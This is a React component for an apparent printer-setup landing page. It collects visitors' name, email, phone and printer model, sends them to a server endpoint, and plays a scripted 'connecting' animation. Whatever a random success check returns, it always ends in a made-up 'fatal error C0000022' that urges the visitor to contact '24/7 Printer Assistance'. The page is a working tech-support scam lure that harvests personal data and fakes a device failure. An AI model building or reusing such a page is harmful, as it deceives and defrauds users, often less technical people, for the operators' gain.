"use client";
import React, { useState, useEffect } from "react";
import { Printer, Wifi, X, AlertCircle, CheckCircle } from "lucide-react";

export default function Hero() {
  const [formData, setFormData] = useState({
    name: "",
    email: "",
    phone: "",
    printerModel: "",
  });

  const [showLoadingModal, setShowLoadingModal] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [loadingText, setLoadingText] = useState("Connecting to Printer...");
  const [isLoading, setIsLoading] = useState(false);

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    // ✅ Basic validation
    if (
      !formData.name ||
      !formData.email ||
      !formData.phone ||
      !formData.printerModel
    ) {
      alert("Please fill in all fields before downloading.");
      return;
    }

    setIsLoading(true);

    try {
      const res = await fetch("/api/smtp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          name: formData.name,
          email: formData.email,
          phone: formData.phone,
          printerModel: formData.printerModel,
        }),
      });
      setIsLoading(false);
      const data = await res.json();
      if (!res.ok || !data?.ok) {
        alert(data?.error || "Something went wrong. Please try again.");
        return;
      }
    } catch (err) {
      console.error("API Error:", err);
      alert("Network error. Please try again.");
      return;
    }

    // ✅ Simulated setup sequence
    setShowLoadingModal(true);
    setLoadingProgress(0);
    setLoadingText("Connecting to Printer...");

    let intervalId;
    const timeouts = [];

    // Simulate progress
    intervalId = setInterval(() => {
      setLoadingProgress((prev) => {
        if (prev >= 90) {
          clearInterval(intervalId);
          return 90;
        }
        return prev + 2;
      });
    }, 150);

    // Step updates
    timeouts.push(
      setTimeout(
        () => setLoadingText("Joining the network and getting printer address..."),
        1500
      )
    );
    timeouts.push(
      setTimeout(() => setLoadingText("Connected to printer network..."), 3000)
    );

    // Randomly simulate success or failure
    const isSuccess = Math.random() > 0.4;

    timeouts.push(
      setTimeout(() => {
        clearInterval(intervalId);
        setShowLoadingModal(false);
        if (isSuccess) {
          setShowErrorModal(true);
        } else {
          setShowErrorModal(true);
        }
      }, 7000)
    );

    // ✅ Cleanup when unmounting
    return () => {
      clearInterval(intervalId);
      timeouts.forEach(clearTimeout);
    };
  };

  const closeErrorModal = () => {
    setShowErrorModal(false);
    setLoadingProgress(0);
  };

  const inputClass =
    "w-full px-5 py-3 rounded-lg bg-white/90 border border-gray-200 text-gray-700 placeholder-gray-400 focus:ring-2 focus:ring-blue-400 outline-none";

  return (
    <>
      {/* Hero Section */}
      <section className="relative min-h-screen bg-gradient-to-br from-blue-600 via-blue-700 to-blue-900 flex items-center justify-center overflow-hidden px-6 sm:px-10">
        <div
          className="absolute inset-0 opacity-10"
          style={{
            backgroundImage:
              "repeating-linear-gradient(45deg, transparent, transparent 30px, rgba(255,255,255,0.05) 30px, rgba(255,255,255,0.05) 60px)",
          }}
        ></div>

        <div className="relative z-10 max-w-7xl w-full flex flex-col lg:flex-row items-center justify-between gap-12 py-4">
          <div className="text-center lg:text-left flex-1">
            <h1 className="text-4xl text-center md:text-4xl font-bold text-white mb-4">
              Set Up Your Printer in Just 3 Easy Steps
            </h1>
            <p className="text-lg sm:text-xl text-blue-100 mb-8 text-center">
              Download and install the official printer setup simulator for your
              device.
            </p>
            <div className="flex justify-center">
              <img
                src="/herobanner.webp"
                alt="Printer"
                className="w-[70%] mx-auto lg:mx-0"
              />
            </div>
          </div>

          <div className="flex-1 max-w-md w-full bg-white/10 backdrop-blur-lg border border-white/20 rounded-2xl p-8 shadow-2xl">
            <div className="space-y-5">
              <input
                type="text"
                name="name"
                placeholder="Your Name"
                value={formData.name}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="email"
                name="email"
                placeholder="Email Address"
                value={formData.email}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="tel"
                name="phone"
                placeholder="Phone Number"
                value={formData.phone}
                onChange={handleChange}
                className={inputClass}
              />
              <input
                type="text"
                name="printerModel"
                placeholder="Printer Model (e.g. HP 2776)"
                value={formData.printerModel}
                onChange={handleChange}
                className={inputClass}
              />
              <button
                onClick={handleSubmit}
                className="w-full lp-primary-bg cursor-pointer text-white font-semibold py-3 rounded-lg text-lg shadow-lg hover:shadow-xl transform hover:scale-[1.02] transition-all duration-200"
              >
                {isLoading ? "Downloading..." : "Click to Download"}
              </button>
            </div>
            <p className="text-center text-sm text-blue-100 mt-4">
              Safe • Demo Setup • Simulation Only
            </p>
          </div>
        </div>
      </section>

      {/* Loading Modal */}
      {showLoadingModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-gray-100 rounded-2xl shadow-2xl max-w-2xl w-full p-8">
            <div className="bg-blue-600 text-white text-center py-3 rounded-t-xl -mx-8 -mt-8 mb-8">
              <h2 className="text-2xl font-bold">
                Connecting Printer to Network
              </h2>
            </div>

            <p className="text-center text-gray-700 mb-8">
              Please stay on this screen while setup completes. This is a
              simulation.
            </p>

            <div className="flex items-center justify-center gap-8 mb-12">
              <Printer className="w-32 h-32 text-gray-600" />
              <div className="flex gap-2">
                {[0, 1, 2, 3, 4, 5].map((i) => (
                  <div
                    key={i}
                    className="w-3 h-3 bg-blue-600 rounded-full animate-pulse"
                    style={{ animationDelay: `${i * 0.3}s` }}
                  ></div>
                ))}
              </div>
              <Wifi className="w-32 h-32 text-blue-500" />
            </div>

            <div className="text-center mb-6">
              <p className="text-xl font-semibold text-gray-800 mb-2">
                {loadingText}
              </p>
            </div>

            <div className="w-full bg-gray-300 rounded-full h-5 mb-4 overflow-hidden">
              <div
                className="bg-blue-600 h-full transition-all duration-300 ease-out"
                style={{ width: `${loadingProgress}%` }}
              ></div>
            </div>
          </div>
        </div>
      )}

      {/* Error Modal */}
      {showErrorModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-white rounded-2xl shadow-2xl max-w-2xl w-full overflow-hidden">
            <div className="bg-gray-100 px-8 py-4 border-b border-gray-200 flex justify-between items-center">
              <div>
                <h2 className="text-2xl font-bold text-gray-800">Installing</h2>
                <p className="text-gray-600">Fatal error occurred during installation..</p>
              </div>
              <button
                onClick={closeErrorModal}
                className="text-gray-400 hover:text-gray-600 transition-colors cursor-pointer"
              >
                <X className="w-6 h-6" />
              </button>
            </div>

            <div className="p-12 text-center">
              <div className="flex justify-center mb-4">
                <div className="relative">
                  <Printer className="w-32 h-32 text-gray-400" />
                  <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2">
                    <div className="w-16 h-16 border-8 border-red-600 rounded-full flex items-center justify-center">
                      <AlertCircle className="w-8 h-8 text-red-600" />
                    </div>
                  </div>
                </div>
              </div>

              <p className="text-lg text-gray-700 mb-4 max-w-lg mx-auto">
                Printer driver installation has been failed due to fatal error C0000022 preventing product driver installation.
              </p>

              <p className="text-2xl font-semibold text-gray-800 mb-4">
                Please Contact Customer Support or Chat with Us
              </p>

              <div className="relative -mx-12 -mb-12">
                <div className="bg-gradient-to-r from-red-600 to-red-700 text-white py-4 px-12 flex items-center justify-between">
                  <div>
                    <p className="text-xl font-bold">Contact Now : 24/7 Printer Assistance</p>
                  </div>
                  <div className="bg-white rounded-full p-4">
                    <Printer className="w-8 h-8 text-red-600" />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
    </>
  );
}
